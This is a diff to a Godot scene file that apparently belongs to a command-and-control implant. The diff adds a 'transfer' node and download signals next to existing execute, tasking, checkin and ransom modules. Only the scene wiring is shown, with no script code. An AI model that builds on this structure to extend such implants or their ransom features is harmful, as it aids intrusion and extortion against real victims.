@@ -1,4 +1,4 @@
-[gd_scene load_steps=17 format=2]
+[gd_scene load_steps=18 format=2]
 
 [ext_resource path="res://execute.gd" type="Script" id=1]
 [ext_resource path="res://api.gd" type="Script" id=2]
@@ -11,6 +11,7 @@
 [ext_resource path="res://fonts/OpenDyslexic3-Regular.ttf" type="DynamicFontData" id=9]
 [ext_resource path="res://ransom.gd" type="Script" id=10]
 [ext_resource path="res://GUI.gd" type="Script" id=11]
+[ext_resource path="res://transfer.gd" type="Script" id=12]
 
 [sub_resource type="DynamicFont" id=1]
 size = 38
@@ -34,6 +35,9 @@ font_data = ExtResource( 9 )
 
 [node name="Agent" type="Node"]
 script = ExtResource( 7 )
+
+[node name="transfer" type="Node" parent="."]
+script = ExtResource( 12 )
 
 [node name="execute" type="Node" parent="."]
 script = ExtResource( 1 )
@@ -151,8 +155,12 @@ disabled = true
 text = "Verify"
 
 [connection signal="checkin" from="." to="checkin" method="_on_Agent_checkin"]
+[connection signal="post_response" from="." to="tasking" method="_on_Agent_post_response"]
 [connection signal="tasking" from="." to="tasking" method="_on_Agent_tasking"]
 [connection signal="agent_response" from="api" to="." method="_on_api_agent_response"]
+[connection signal="download" from="tasking" to="transfer" method="_on_tasking_download"]
+[connection signal="download_chunk" from="tasking" to="transfer" method="_on_tasking_download_chunk"]
+[connection signal="download_start" from="tasking" to="transfer" method="_on_tasking_download_start"]
 [connection signal="exit" from="tasking" to="." method="_on_tasking_exit"]
 [connection signal="post_response" from="tasking" to="api" method="_on_tasking_post_response"]
 [connection signal="ransom" from="tasking" to="ransom" method="_on_tasking_ransom"]
